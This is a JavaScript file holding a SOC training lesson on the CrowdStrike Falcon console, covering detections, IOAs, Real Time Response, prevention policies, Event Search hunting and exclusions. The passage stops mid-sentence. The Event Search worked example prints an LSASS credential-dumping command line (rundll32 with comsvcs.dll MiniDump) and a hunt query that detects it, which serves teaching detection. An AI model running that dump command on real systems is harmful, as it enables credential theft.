// Learning Path lessons — Vendor-specific EDR consoles module L
const lessons = [
  {
    "id": "local-lesson-33",
    "slug": "crowdstrike-falcon-console",
    "title": "CrowdStrike Falcon: Detections, IOAs, and Real Time Response",
    "topic": "Endpoint Security",
    "difficulty": "advanced",
    "kind": "lesson",
    "intro": "You already know, from earlier material on this platform, what an EDR product is supposed to do in the abstract: watch endpoint activity, flag what looks malicious, and give an analyst a way to respond. That abstraction is useful for a first day on the job, and useless by the second, because no analyst investigates 'EDR' in general. They investigate a specific console, with a specific vocabulary, specific fields, and specific limits on what a specific button actually does. If your organization runs CrowdStrike, that console is Falcon, and this lesson is about Falcon specifically — not a comparison, not a refresher on EDR theory, but the terminology and judgment calls you need the moment a Falcon detection lands in your queue.\n\nFalcon's identity as a product rests on a handful of deliberate design choices that shape how you work in it every day. The sensor on the endpoint is intentionally tiny and does almost no thinking of its own; nearly all the analytical weight sits in CrowdStrike's cloud, which is why a single detection can arrive already scored, already tagged with a MITRE technique, and already grouped with other related detections into something Falcon calls an Incident. Falcon is also, more than most competitors, built around the idea that behavior matters more than any single artifact — the platform's signature detections are called Indicators of Attack, not Indicators of Compromise, and understanding why that distinction is not just marketing language is one of the most useful things this lesson will teach you.\n\nBy the end of this lesson you will be able to read a Falcon detection card and immediately know whether you are looking at a single event or an automatically correlated attack chain, and why that grouping changes your triage plan. You will understand the practical difference between an IOA-based detection and an IOC-based one, and why an IOA survives an attacker changing tools while an IOC does not. You will know exactly what Real Time Response is built for, what it explicitly is not built for, and why every action inside it is logged. And you will understand why a Falcon sensor group configured for Detect-only, rather than Prevent, is one of the most dangerous and most common misconfigurations a SOC inherits — because it looks, from the outside, exactly like protection.",
    "sections": [
      {
        "heading": "Zero to Hero: What an EDR Console Is, and Falcon's Core Vocabulary at a Glance",
        "content": "Before the architecture, the process trees, and the policy tables below, pause for the sixty-second version — every term after this paragraph assumes you already have it.\n\nAn **EDR console** (Endpoint Detection and Response console) is simply the web dashboard a small piece of software — the *sensor* — reports back to, from every laptop, server, and workstation it runs on. Picture each sensor as a security camera bolted to one machine, quietly recording what runs, what connects, what changes; the console is the monitoring room where every camera's footage lands, gets reviewed, and acted on from one screen — instead of you walking to a thousand separate machines to check each one by hand. `Falcon` is CrowdStrike's name for that whole system: the sensor, the cloud brain behind it, and the console you sit in front of are all 'Falcon'.\n\n### Four terms you will meet constantly below\n\nHere they are in one place, in plain language, before each gets its own full section:\n\n- **`Detection` / `Incident`** — a Detection is one flagged event; an Incident is Falcon's automatic grouping of several related Detections into one attack story. (Full explanation in the next section.)\n- **`IOA` (Indicator of Attack) and `IOC` (Indicator of Compromise)** — an IOC is a known-bad *artifact*, like a specific file hash, IP, or domain; an IOA is a suspicious *behavior pattern*, like an unusual process reaching into another process's memory, regardless of which tool produced it. Falcon leans heavily on IOAs.\n- **`Event Search`** — the console screen where you query the raw stream of everything the sensor ever recorded, not only what Falcon decided to flag as a Detection. If a Detection is the highlight reel, Event Search is the full, unedited security-camera footage.\n- **`RTR` (Real Time Response)** — a remote command shell into a live endpoint, run entirely from inside the console, so an analyst can look around a machine and act on it without leaving their desk or physically touching the device.\n\nHold these four loosely for now — each one gets a full section below, with real examples and, for Event Search, an actual query you can read line by line. The only job of this section is to make sure none of them lands on you cold."
      },
      {
        "heading": "A Lightweight Sensor and a Heavyweight Cloud: What Falcon's Architecture Means for You",
        "content": "CrowdStrike built Falcon around a single architectural bet: keep the thing running on the endpoint as small and dumb as possible, and put nearly all the intelligence somewhere the attacker cannot touch it. The **Falcon Sensor** installed on a workstation or server is deliberately lightweight, commonly cited by CrowdStrike at under 5 MB, and it runs in kernel mode — the most privileged layer of the operating system, below almost everything else that runs on the machine, including most malware. From that vantage point, the sensor observes process creation, file writes, registry changes, and network connections as they happen, and it streams that telemetry to CrowdStrike's cloud continuously rather than storing and analyzing it locally.\n\nThat telemetry lands in what CrowdStrike calls the **Threat Graph**, a cloud-scale data store holding event data contributed by every Falcon-protected endpoint across every CrowdStrike customer. This matters to you as an analyst in two concrete ways:\n\n- **Collective learning, applied instantly.** When CrowdStrike's cloud models learn to recognize a new attacker pattern from telemetry observed at one customer, every other Falcon customer's environment benefits from that recognition almost immediately, without waiting for you to download and deploy a signature update.\n- **The heavy lifting happens before you look.** Correlation, scoring, grouping related events, and mapping to MITRE ATT&CK have already happened by the time a detection reaches you.\n\nYou are not the first layer of analysis; you are reviewing a conclusion the cloud already reached and deciding whether to agree with it, escalate it, or dismiss it.\n\n### What this means when you open the console\n\nBecause the sensor itself does not carry the burden of deciding what is malicious, it stays fast and hard to detect or disable from inside the compromised host — an attacker with local administrator rights on a workstation still cannot simply kill a kernel-mode sensor process the way they might terminate a lightweight user-mode agent.\n\nThis is also why Falcon's detection quality depends heavily on network connectivity: an endpoint that is air-gapped or has lost connectivity to CrowdStrike's cloud is still logging locally and will catch up once connectivity resumes, but it loses the real-time cloud correlation and the ability for an analyst to pull live telemetry from it while it is offline. When you are triaging a Falcon alert and a host has not checked in recently, that gap in visibility is itself worth noting in your investigation, not just an inconvenience.\n\n### Sensor groups and policies\n\nFalcon does not apply one blanket configuration to every endpoint. Hosts are organized into **Host Groups**, and each group is assigned **Sensor Policies** that control what the sensor does — which detection and prevention features are active, at what sensitivity, and whether certain exclusions apply. A domain controller and a marketing laptop are very different assets with very different tolerance for false positives and very different consequences if compromised, and CrowdStrike expects organizations to reflect that with different policy assignments rather than a single global setting.\n\nAs an analyst, one of your first questions when a detection looks softer than you expected — or when prevention should have blocked something and did not — is which Host Group the affected machine belongs to and what policy is actually applied to it, because the console's global-looking settings page can hide meaningfully different configurations across your fleet.\n\n### Host Management as your inventory of truth\n\nThe **Host Management** page lists every enrolled endpoint with its sensor version, last check-in time, operating system, and assigned Host Group. Before you trust any conclusion about an endpoint's protection state — including its absence — check four things on this page:\n\n- Is the sensor version current?\n- What was the last check-in time? A stale timestamp on a host involved in an active investigation is worth chasing on its own, since it can mean the attacker disabled or evaded the sensor rather than that the machine is simply powered off.\n- Which Host Group is this endpoint in?\n- Which Sensor Policy does that Host Group actually have applied?\n\nA domain controller and a laptop should almost never share one policy, and a 'protected' host with a policy mismatch is a common root cause when something you expected to be blocked was only ever logged."
      },
      {
        "heading": "Detection vs. Incident: Reading the Process Tree Instead of a Pile of Alerts",
        "content": "The single most important structural concept in the Falcon console is the difference between a **Detection** and an **Incident**, and confusing the two is the fastest way to under-triage a serious attack. A Detection is Falcon's record of one specific suspicious event — a process that requested access to LSASS memory, a scheduled task created with an unusual name, a PowerShell process launched with an encoded command. Each Detection carries its own severity, its own MITRE ATT&CK tactic and technique tags, its own confidence score, and its own process tree showing exactly what launched what.\n\nBut real attacks are rarely a single event. A phishing document that spawns PowerShell, which downloads a second-stage payload, which dumps credentials, which is then used to move laterally to a second host, can easily generate four, five, or more separate Detections across one or more machines. Reviewing each of those as an isolated case wastes time and, worse, risks an analyst closing three of the four as individually low-severity without ever seeing that together they describe one coherent attack.\n\nFalcon's answer to this is the **Incident**: an automatic grouping of related Detections that Falcon's cloud correlation engine determines belong to the same attack chain, based on shared process lineage, shared hosts, shared timing, and shared indicators. Instead of four disconnected cards, you open one Incident and see the full chain end to end, with a single combined severity score reflecting the worst thing that happened anywhere in the chain.\n\n### The process tree is where you actually read the story\n\nInside a Detection or an Incident, the process tree is a visual diagram of parent-child relationships: which executable launched which, in order, with the exact command line for each step. This is not decoration — it is frequently the fastest way to distinguish a true positive from a false positive, because the shape of the tree itself carries meaning.\n\nA Word document process spawning a PowerShell process is a shape that essentially never occurs during normal document editing; a scheduled task run under the SYSTEM account spawning an unfamiliar binary from a Temp directory is a shape a legitimate administrative task rarely takes. Reading the tree top to bottom lets you reconstruct initial access, execution, and any subsequent steps without pivoting between five different log sources, because Falcon has already assembled them into one connected view.\n\n### What this means for your triage order\n\nWhen an Incident contains multiple Detections, do not simply work through them as separate tickets in whatever order they appear. Start from the earliest event in the process tree — that is almost always the initial access point — and read forward chronologically, exactly the way you would read any other attack timeline. Ask, at each step, whether the next process in the chain is a plausible legitimate continuation of the one before it, or a shape that only makes sense if something malicious is directing it. An Incident with a Critical-severity Detection buried in the middle of an otherwise Medium-severity chain still deserves the urgency of the highest severity present, because the chain is one attack, not four unrelated coincidences that happen to share a host.\n\n### A practical caution\n\nAutomatic grouping is powerful, but it is still an algorithm's best guess at correlation, not a guarantee. Two genuinely unrelated Detections on the same host in a short window — a stale credential-dumping tool a red team left behind years ago finally triggering, alongside an unrelated phishing click the same afternoon — can occasionally land in the same Incident. Treat the grouping as a strong starting hypothesis that saves you real time, not as an infallible verdict that relieves you of reading the individual Detections underneath it.",
        "codeExample": "flowchart TD\n  A[\"WINWORD.EXE opens Q3_Invoice.docm\"] --> B[\"powershell.exe -EncodedCommand\"]\n  B --> C[\"Detection 1: Suspicious Office child process\"]\n  B --> D[\"rundll32.exe loads comsvcs.dll against lsass.exe\"]\n  D --> E[\"Detection 2: Credential Access - LSASS Memory\"]\n  C --> F{\"Falcon cloud correlation engine\"}\n  E --> F\n  F --> G[\"One Incident, combined severity, full process tree\"]",
        "image": {
          "src": "/lesson-images/edr/edr-detection-console-mockup.svg",
          "alt": "An illustrative EDR console mockup showing a detection list with severity, host, tactic and status columns; a process tree where explorer.exe leads to outlook.exe, winword.exe, then powershell.exe with an encoded command and rundll32.exe making an outbound connection; a response action bar with kill process, quarantine file, isolate host and remote shell; and a table mapping each action to its CrowdStrike, SentinelOne and Microsoft Defender name.",
          "caption": "A generic console mockup — the layout every EDR shares, and the three names each action goes by.",
          "credit": "Illustrative mockup authored for this course. Not a screenshot of any vendor product."
        }
      },
      {
        "heading": "IOA vs. IOC: Why Falcon Bets on Behavior Over Artifacts",
        "content": "CrowdStrike's marketing repeats a specific phrase often enough that it is worth taking seriously rather than dismissing as slogan: Falcon is built to detect **Indicators of Attack (IOAs)**, not just **Indicators of Compromise (IOCs)**. The distinction is not cosmetic, and understanding it changes how you read every detection in the console.\n\nAn **IOC** is a static artifact tied to a specific known-bad thing: a file hash, a malicious IP address, a domain name, a specific registry key a particular malware family creates. IOC-based detection asks a simple question — have I seen this exact artifact before, on a list of known-bad things? It is fast, cheap, and precise when it matches, but it is also trivially easy for an attacker to defeat: recompile the malware and the hash changes completely; stand up new infrastructure and the IP is different; the detection that worked yesterday is blind today, at essentially zero cost to the attacker.\n\nAn **IOA**, by contrast, describes a pattern of behavior and intent rather than a specific artifact — the sequence and context of what a process is actually doing, independent of what tool is doing it. A classic Falcon IOA does not ask 'is this file a known Mimikatz binary,' it asks something closer to 'is an unexpected process requesting broad access to lsass.exe memory shortly after being spawned by an unusual parent process.'\n\nThat behavioral pattern is what credential dumping actually requires to work — regardless of whether the tool doing it is Mimikatz, a custom-written equivalent, or a legitimate administrative utility being abused for the same purpose. An attacker who swaps tools to evade a hash-based signature gains nothing against an IOA, because the underlying behavior their goal requires does not change; they would have to abandon the technique itself, not just the file.\n\n**The distinction summarized:**\n\n- **IOC (Indicator of Compromise)** — asks whether this exact artifact (a hash, IP, domain, registry key) has been seen before. Fast and precise when it matches, but trivially defeated: recompile the malware or stand up new infrastructure and the indicator changes completely.\n- **IOA (Indicator of Attack)** — asks whether the current behavior matches the pattern an attack technique requires, regardless of which tool produced it. Defeating it means abandoning the technique itself, not just swapping files.\n\n| Aspect | IOC (Indicator of Compromise) | IOA (Indicator of Attack) |\n| --- | --- | --- |\n| What it matches | A static artifact — file hash, IP, domain, registry key | A pattern of behavior and intent, independent of the tool |\n| Question it asks | Have I seen this exact artifact before? | Does the current behavior match the pattern an attack technique requires? |\n| Strength | Fast, cheap, and precise when it matches | Catches attacker tooling never seen before, including custom or newly compiled malware |\n| How it is defeated | Trivially — recompile the malware or stand up new infrastructure and the indicator changes | Only by abandoning the technique itself, not just swapping files |\n\n### Where this shows up in the console\n\nWhen you open a Detection in Falcon, the MITRE ATT&CK technique tag — something like T1003.001, OS Credential Dumping: LSASS Memory — usually reflects an IOA-driven detection rather than a hash match. The GrantedAccess field showing 0x1FFFFF (PROCESS_ALL_ACCESS) against lsass.exe is a textbook example: Falcon is not asserting it recognizes the specific tool involved, it is asserting that the access pattern requested is the access pattern credential theft requires, and that pattern is suspicious regardless of which binary requested it. This is precisely why Falcon can catch attacker tooling it has never seen before, including custom or newly compiled malware with no prior reputation anywhere — the behavior gives it away even when the file itself is brand new.\n\n### Custom IOA rules\n\nBeyond CrowdStrike's built-in IOAs, Falcon lets an organization author its own custom IOA rules for behavior specific to their environment — for example, flagging any process execution from a network share that should never legitimately run code, or any child process of a specific line-of-business application that should never spawn a shell. Writing a good custom IOA requires the same discipline as any detection engineering: name the exact behavioral pattern, not a specific file, so the rule survives the inevitable day an attacker changes their tooling but not their objective.\n\n### Why this matters for your judgment, not just your vocabulary\n\nWhen you see an IOA-driven detection with only moderate confidence, resist the instinct to dismiss it because 'nothing came back on the hash.' A clean or unknown hash paired with a genuinely suspicious access pattern is not reassurance — it is often exactly what a competent, freshly built attacker tool looks like, precisely because it has no reputation history yet for you to check."
      },
      {
        "heading": "Real Time Response: What You Can Do, and Where the Line Sits",
        "content": "**Real Time Response (RTR)** is Falcon's remote shell into a live endpoint, established over the same encrypted channel the sensor already uses to talk to CrowdStrike's cloud — no VPN, no RDP port opened, no separate remote-access tool installed. For a SOC analyst, RTR is what turns 'I think that laptop in another office is compromised' into an actual investigation you can act on within minutes, without anyone physically touching the machine.\n\n### What RTR is built for\n\nInside an RTR session, an analyst runs CrowdStrike-specific commands rather than native cmd or bash, organized around four broad categories of work:\n\n- **Investigation** — ps lists running processes, netstat shows active network connections, reg query reads registry values, and ls / cd browse the filesystem.\n- **Evidence collection** — get pulls a specific file off the endpoint for offline analysis, and higher-privilege sessions can pull a full memory dump for deeper forensic work.\n- **Narrow containment** — kill terminates a specific malicious process by PID, and rm removes a specific file, such as a dropped payload or a persistence artifact.\n- **Scripted remediation** — higher-privilege operators can put a script or tool onto the endpoint and run it, which is how many organizations deploy a custom remediation script at scale across dozens of compromised hosts simultaneously rather than touching each one by hand.\n\n### Privilege tiers, on purpose\n\nNot every Falcon user gets full RTR capability. CrowdStrike separates RTR access into tiers:\n\n- **Read-only investigative tier** — can run informational commands like ps and netstat.\n- **Active-response tier** — adds the ability to kill processes and remove files.\n- **Falcon administrator tier** — adds the ability to put and run scripts.\n\nThis tiering exists because RTR is powerful enough to do real damage if misused, or if an attacker somehow gained access to an analyst's own Falcon account. Restricting who can push arbitrary scripts to production endpoints is a basic operational safeguard, not bureaucratic friction.\n\n### Every action is logged, by design\n\nEvery command typed in an RTR session, and every file retrieved or deleted, is recorded in an audit trail tied to the analyst's identity. This matters in two directions: it protects the organization by creating a defensible record of exactly what was done to a host during an investigation, and it protects the analyst, because 'I ran a command that unexpectedly broke something' is a very different conversation with a full audit log than without one. Treat RTR the way you would treat any action on a production system during an active incident — deliberate, documented in your case notes as you go, not just recoverable after the fact from the audit log.\n\n### What RTR is explicitly not for\n\nRTR is not a substitute for network containment. Killing a process and deleting a file stops what you can see, but it does nothing about persistence mechanisms you have not found yet, and it does nothing to stop an attacker with an active foothold from simply relaunching.\n\nFor that, Falcon offers **Network Containment**, a separate action that isolates the host from the network while deliberately preserving its connection to CrowdStrike's cloud — meaning you can still run RTR against a contained host even though it can no longer talk to anything else, including the attacker's infrastructure. The correct sequence in a serious incident is usually contain first to stop the bleeding, then use RTR against the now-isolated host to investigate and collect evidence, rather than leaving a live host connected to the network while you poke around inside it.",
        "codeExample": "// RTR command reference — organized by what each tier actually does\n//\n// READ-ONLY / INVESTIGATIVE TIER\n//   ps                    list running processes\n//   netstat               show active network connections\n//   reg query <key>       read a registry value\n//   ls / cd               browse the filesystem\n//\n// ACTIVE RESPONDER TIER (adds)\n//   get <filepath>        retrieve a file for offline analysis\n//   kill <pid>             terminate a specific process\n//   rm <filepath>          remove a specific file\n//\n// FALCON ADMINISTRATOR TIER (adds)\n//   put <file>             stage a script/tool onto the endpoint\n//   run <script>           execute the staged script\n//\n// EVERY command above is written to an audit trail tied to the analyst.\n//\n// RECOMMENDED SEQUENCE during active compromise:\n//   1. Network Containment  -> isolate host, KEEP cloud channel alive\n//   2. RTR (this session)   -> investigate + collect evidence on the\n//                              now-isolated host, safely, with logging"
      },
      {
        "heading": "Prevention Policies: Detect-Only Is Not Protection, It Only Looks Like It",
        "content": "Every Host Group in Falcon is governed by a **Prevention Policy**, and the single most consequential setting inside it is whether the group runs in **Prevent** mode or **Detect-only** mode. The distinction sounds simple, but the consequence of getting it wrong is one of the most common and most dangerous gaps a SOC inherits from whoever configured the environment before them.\n\n**In Prevent mode**, when Falcon's machine learning models or IOA engine score a process as sufficiently malicious, the sensor blocks it automatically — the process is killed, or never allowed to execute in the first place, before it does anything further. **In Detect-only mode**, the exact same scoring happens, the exact same Detection appears in the console with the exact same severity and confidence, but nothing is blocked. The malicious process runs to completion, unopposed, while a card describing what it did waits for an analyst to notice it.\n\n### Why Detect-only exists at all\n\nThis is a legitimate mode, not a bug — organizations deploying Falcon for the first time commonly run new Host Groups in Detect-only for a calibration period, watching what the ML models would have blocked before committing to automatic prevention, specifically to catch false positives that would otherwise disrupt business-critical software before trust in the tuning is established. Some highly custom or fragile legacy environments also stay in Detect-only permanently because a false block on a critical process is judged more disruptive than the residual risk, a genuine risk tradeoff a security team can reasonably choose to make with eyes open.\n\n### Why it becomes dangerous\n\nThe failure mode is not the existence of Detect-only mode — it is a Host Group left in Detect-only by default, by oversight, or because the calibration period that was supposed to be temporary was simply never revisited, while everyone downstream assumes 'we have EDR deployed there' means 'we are protected there.'\n\nA SOC that only ever looks at the Detections page sees exactly the same volume and severity of alerts whether a host is in Prevent or Detect-only, because Falcon still generates and displays every Detection either way — the console gives you no loud, unmissable signal that protection was actually absent unless you specifically go check the policy. This is precisely why a ransomware operator who lands on a Detect-only host can execute their entire encryption routine while Falcon faithfully logs every step of it, generating a perfect forensic record of an attack nobody stopped.\n\n### The tuning dial within Prevent\n\nEven within Prevent mode, Falcon exposes a machine-learning sensitivity slider — commonly labeled across levels like Cautious, Moderate, Aggressive, and Extra Aggressive — that trades false-positive risk against detection aggressiveness. A Cautious setting blocks only the highest-confidence matches, minimizing disruption to legitimate software at the cost of letting more borderline-malicious activity through undetected; an Extra Aggressive setting blocks far more readily, catching more real threats at the cost of more false positives against unusual-but-legitimate business software.\n\nThere is no universally correct setting — the right level depends on the asset's criticality and the organization's tolerance for a blocked legitimate process versus a missed malicious one, which is exactly why different Host Groups should carry different policies rather than one setting applied blindly everywhere.\n\n### What this means for you as an analyst\n\nWhen you close a Detection as handled, or when you are surprised that an attack you expected Falcon to stop actually completed, the very first thing to check — before questioning the detection engine's competence — is which Prevention Policy governs that specific Host Group, and whether it was ever set to Prevent at all. A detection with a perfect severity score and full ATT&CK mapping tells you Falcon understood the attack correctly. It tells you nothing about whether Falcon was allowed to stop it.",
        "codeExample": "flowchart TD\n  A[\"Falcon scores a running process as malicious\"] --> B{\"Prevention Policy mode for this Host Group?\"}\n  B -->|\"Detect-only\"| C[\"Detection logged, process runs to completion\"]\n  B -->|\"Prevent\"| D{\"ML confidence above policy threshold?\"}\n  D -->|\"Yes\"| E[\"Process blocked automatically before impact\"]\n  D -->|\"No / below threshold\"| F[\"Detection logged for analyst review only\"]\n  C --> G[\"Attack completes; analyst finds a perfect forensic record, too late\"]\n  E --> H[\"Attack stopped; analyst reviews and closes the case\"]"
      },
      {
        "heading": "Hunting in Falcon: Event Search and the Raw Telemetry Beneath the Detections",
        "content": "The detections Falcon surfaces are only the tip of what its sensor actually collects. Every managed host streams a continuous river of **raw events** — every process that ran, every network connection, every DNS lookup, every file written — to the Falcon cloud, whether or not any detection fired. The console's **Event Search** (also called Advanced Event Search) is where you query that raw river directly, and learning to use it is what turns you from someone who *reacts to* Falcon detections into someone who *hunts* through Falcon data.\n\nThe mental model is important: a detection is Falcon's *opinion* that something matched a behavioural rule; the raw events are the *ground truth* of what happened, opinion or not. So Event Search answers questions detections never raised:\n\n- **Pivot from a single fact to the whole story.** Given one hash, one IP, or one host, you can search the raw telemetry for every event that touched it across the *entire* fleet and time range — the mechanical pivoting from the analyst-mindset lesson, executed at scale.\n- **Hunt for behaviour that has no detection yet.** \"Show me every host where a Microsoft Office process spawned PowerShell in the last week\" is a hunt you run against raw `ProcessRollup2` events even if no rule alerts on it — proactively finding the technique (the pyramid's painful top) rather than waiting for a signature.\n- **Confirm scope during an incident.** Once you know an indicator, raw event search tells you *how many other machines* saw it — the difference between \"one host\" and \"forty hosts\" that decides an incident's severity.\n\nTwo things make this practical. First, know the **key event types** the sensor emits — process creation, network connections, DNS requests, file and registry activity — because your searches filter on them, and knowing which event holds which fact is what makes a query precise rather than a fishing trip. Second, **save the searches that pay off**: a hunt that reliably surfaces something valuable should become a saved query or, better, graduate into a **custom detection** (the next section) so it watches automatically instead of being re-typed. The lesson mirrors the SIEM material: the detections are curated highlights, but the raw telemetry is the corpus — and the analyst who can query the corpus directly is no longer limited to the questions the vendor thought to ask. The worked example below walks a real Event Search query end to end, line by line."
      },
      {
        "heading": "Worked Example: Hunting LSASS Access with Falcon Event Search",
        "content": "Reading about Event Search is not the same as running one. Here is a real hunt, step by step, in the syntax Falcon's Advanced Event Search actually uses — a pipe-based query language over the same event schema the sensor streams to the cloud. The field names below — `event_simpleName`, `ComputerName`, `FileName`, `CommandLine`, `ParentBaseFileName` — are the sensor's own real field names, not invented shorthand.\n\nSuppose you want every case, across the whole fleet, where `rundll32.exe` was launched with `comsvcs.dll` on its command line in the last 24 hours — the exact LSASS-dumping technique the IOA section above described, but here you are hunting for it directly in raw events rather than waiting for a Detection card to appear:\n\n```\nevent_simpleName=ProcessRollup2 FileName=rundll32.exe CommandLine=\"*comsvcs.dll*\"\n| table([ComputerName, UserName, ParentBaseFileName, CommandLine, timestamp])\n| sort(timestamp, order=desc)\n| head(20)\n```\n\nRead it exactly like the SPL and AQL pipelines from earlier SIEM lessons — left to right, each stage narrowing the last:\n\n- `event_simpleName=ProcessRollup2` — scope to process-launch events only (`ProcessRollup2` is the real Falcon event type recorded every time a process starts).\n- `FileName=rundll32.exe CommandLine=\"*comsvcs.dll*\"` — keep only launches of that one binary whose command line mentions `comsvcs.dll`, the DLL abused to dump LSASS memory.\n- `| table([...])` — show only the columns that matter for triage, not the entire raw event.\n- `| sort(timestamp, order=desc)` then `| head(20)` — newest events first, capped at 20 rows so the result stays skimmable.\n\nSample result rows might look like this:\n\n```\nComputerName   UserName    ParentBaseFileName   CommandLine                                          timestamp\nWKS-FIN-014    j.alvarez   cmd.exe              rundll32.exe comsvcs.dll, MiniDump 812 out.dmp        2026-08-15T14:02:11Z\nWKS-HR-221     s.chen      explorer.exe         rundll32.exe printui.dll,PrintUIEntry                 2026-08-15T09:41:07Z\n```\n\nTwo rows, same `FileName`, completely different stories. The first has `cmd.exe` as its parent and a command line asking `comsvcs.dll` to `MiniDump` process `812` to a file — exactly the LSASS-dump pattern from the IOA section, on a finance workstation, worth an immediate follow-up. The second is `rundll32.exe` calling `printui.dll` from `explorer.exe` — an entirely ordinary printer-dialog launch that happens to share the same `FileName` value. This is the habit Event Search is built to train: the query gets you a short, relevant list fast, but the `CommandLine` and `ParentBaseFileName` columns — not the mere fact that `rundll32.exe` ran — are what actually separate the row worth escalating from the one that is not."
      },
      {
        "heading": "Custom IOAs and Indicator Management: Authoring Your Own Detections",
        "content": "Out-of-the-box detections are written by CrowdStrike for threats everyone faces. But your environment has its *own* normal and its *own* threats, so a mature use of Falcon means **authoring your own detections and managing your own indicators** — moving from consumer of detections to author of them. The console gives you two distinct tools for this, and knowing which to reach for is the skill.\n\n**Custom IOA rules** are for *behaviour*. Recall that an IOA (Indicator of Attack) describes what an attacker *does* rather than a specific artifact. Falcon lets you write **custom IOA rules** — grouped into rule sets and scoped to host groups — that say, for example, \"alert (or block) when *this* process, launched from *this* path, does *this*.\" Because they target behaviour, custom IOAs are durable in exactly the Pyramid-of-Pain sense: they keep working across an attacker's disposable files and infrastructure. You use them to codify a hunt you validated, or to catch activity specific to your environment that no generic rule covers.\n\n**IOC management** is for *artifacts*. Here you manage lists of specific indicators — file hashes, IP addresses, domains — and, crucially, assign each an **action**: **detect**, **prevent/block**, or **allow**. This is how you operationalise threat intelligence (block the hashes and domains from an advisory) *and* how you tune out noise (allow a known-good but frequently-flagged internal tool). The action model is the powerful part: the same IOC list drives both proactive blocking and false-positive suppression.\n\nThe judgment these tools demand is the tuning discipline that runs through the whole SOC curriculum:\n\n- **Custom detections must be tuned like any rule.** A sloppy custom IOA floods the console or, if set to block, breaks legitimate work — so test in *detect* mode before you *prevent*, exactly like the ASR audit-first principle. Authoring detections carries the responsibility of not creating false positives or, worse, blocking the business.\n- **Allowlisting is a loaded gun.** An IOC set to *allow* silences future detections on that indicator forever — which is essential for killing a persistent false positive but dangerous if you allow something that later turns malicious. Every allow entry is a deliberate, documented decision, not a reflex to make an alert go away.\n\nThe takeaway: Falcon is not just a set of alarms you answer — it is a platform you *configure*. Custom IOAs let you detect the behaviours that matter to you, indicator management lets you block the artifacts you know are bad and silence the ones you know are fine, and both come with the standing obligation to tune carefully so your detections help the SOC rather than drown it."
      },
      {
        "heading": "The Falcon Platform Beyond EDR: Identity, Exposure, and Intelligence",
        "content": "Falcon began as endpoint detection and response, but the modern console is a **platform** of modules that share the same lightweight sensor and cloud — and knowing what those modules offer changes how you investigate, because the answer to an EDR dead-end is often *another Falcon module*, not another vendor. You will not administer all of these, but you should know what each one lets you pivot into.\n\nThe modules an analyst most often touches:\n\n- **Identity Protection.** Endpoint EDR is blind to the identity plane (as the EDR lesson's blind-spots section explained). Falcon **Identity Protection** watches **Active Directory and identity behaviour** — detecting things like anomalous authentications, risky privileged logons, and the credential-attack patterns from the AD lessons — and can enforce risk-based conditions. When your endpoint story runs into \"then they logged in somewhere,\" this is where that half of the investigation lives.\n- **Spotlight (vulnerability / exposure management).** **Spotlight** surfaces the **vulnerabilities and exposures** on your managed hosts *using the same sensor*, with no separate scanner — turning the EDR agent into a live exposure feed. It connects detection to *prevention*: knowing that the host an attacker landed on has a critical unpatched CVE reframes the urgency and the remediation.\n- **Falcon Intelligence.** The built-in **threat intelligence** module enriches a detection with context about the adversary — attributing tradecraft to known groups, linking indicators to campaigns, and providing malware analysis. It is how \"this hash is bad\" becomes \"this matches a specific actor's tooling,\" which sharpens both severity and response.\n- **Discover / asset inventory.** Because the sensor sees the environment, Falcon can inventory **managed assets** and help surface **unmanaged ones** — directly addressing the \"unmanaged devices are a blind spot\" problem by at least revealing what exists.\n\nThe unifying idea is a workflow one, and it ties the platform back to the analyst mindset: **when an investigation reaches the edge of endpoint visibility, look sideways across the platform before you conclude.** The endpoint detection leads to an identity question — pivot to Identity Protection. The compromised host prompts \"how did they get RCE?\" — check Spotlight for its vulnerabilities. The indicator needs context — enrich it with Intelligence. A single console that spans endpoint, identity, exposure, and intel means much of the pivoting and enrichment that would otherwise cross four tools happens in one place — which is exactly the correlated, XDR-style visibility the EDR lesson pointed toward, delivered as one integrated platform."
      },
      {
        "heading": "Exclusions: Tuning Falcon Without Quietly Turning Off Protection",
        "content": "Every EDR eventually collides with a legitimate application that its detection engines find suspicious — a backup agent that reads thousands of files a minute, a homegrown deployment script that looks like a dropper, a line-of-business tool that touches process memory the way credential-theft tools do. Falcon's answer is a deliberately narrow set of **Exclusions**, managed centrally under Configuration > Detections Management > Exclusions, and the single most important thing to understand about them is that they are not interchangeable — each of the three main types silences a different layer of protection, and choosing the wrong one for the job either fails to fix the noise or, worse, opens a hole far larger than the problem required.\n\n### The three exclusion types, and what each actually silences\n\n- **Machine Learning Exclusions** — for a trusted file path, this stops Falcon's ML-based detections and preventions from firing on files in that path, and can optionally also stop those files from being uploaded to CrowdStrike's cloud for analysis. This is the right tool when a specific, known-clean binary or installer keeps tripping a static ML verdict.\n- **IOA Exclusions** — this stops behavioral detections and preventions tied to a specific CrowdStrike-generated IOA from firing for a defined process or path. It is the right tool when a legitimate application's *behavior* — not its file signature — matches a built-in IOA pattern. Critically, not everything can be excluded this way: CrowdStrike explicitly does not allow excluding OverWatch findings, custom IOA rules, or several other detection classes through this mechanism, by design, because those categories are considered too security-relevant to silence with a simple path exclusion.\n- **Sensor Visibility Exclusions** — the broadest and most dangerous of the three. This does not just stop detections; it minimizes what the sensor even *records* for the excluded path, and stops all associated detections and preventions outright. CrowdStrike's own guidance is blunt about the risk: excluded files are not recorded, detected, or prevented at all, so any attacker activity that happens to occur inside that excluded path becomes functionally invisible to Falcon, not merely unblocked.\n\n| Exclusion type | What it silences | Typical use case | Relative risk |\n| --- | --- | --- | --- |\n| Machine Learning | Static ML detections/preventions for a path; optionally stops cloud upload | A known-clean installer or binary trips a static ML verdict | Low-to-moderate |\n| IOA | Behavioral detections/preventions for a specific IOA pattern | A legitimate app's behavior matches a built-in IOA (not custom IOAs, not OverWatch) | Moderate |\n| Sensor Visibility | Recording, detection, AND prevention for the whole path | Extreme, narrowly-scoped cases only (e.g. a verified backup agent with severe performance conflicts) | High — attacker activity in that path becomes invisible |\n\n### Why every exclusion is an audited, deliberate decision\n\nFalcon records every exclusion change — create, edit, delete — in an audit log, and CrowdStrike's own guidance recommends attaching a comment to every change explaining why it was made. This mirrors the same discipline the IOC allowlisting section already taught: an exclusion is not a way to make an annoying alert disappear, it is a standing, reviewable decision to stop looking at part of your own environment, and it should be scoped as narrowly as the underlying problem actually requires — a specific file path and process, not an entire drive or a whole application vendor's folder tree. Changes typically take up to 40 minutes to propagate to affected sensors, which is worth knowing so you do not assume an exclusion failed simply because it has not applied yet.\n\n### What this means for your triage\n\nWhen a detection you expected never fires — or fires once and then mysteriously stops for the same host and pattern — checking the Exclusions page belongs in the same triage habit as checking a Host 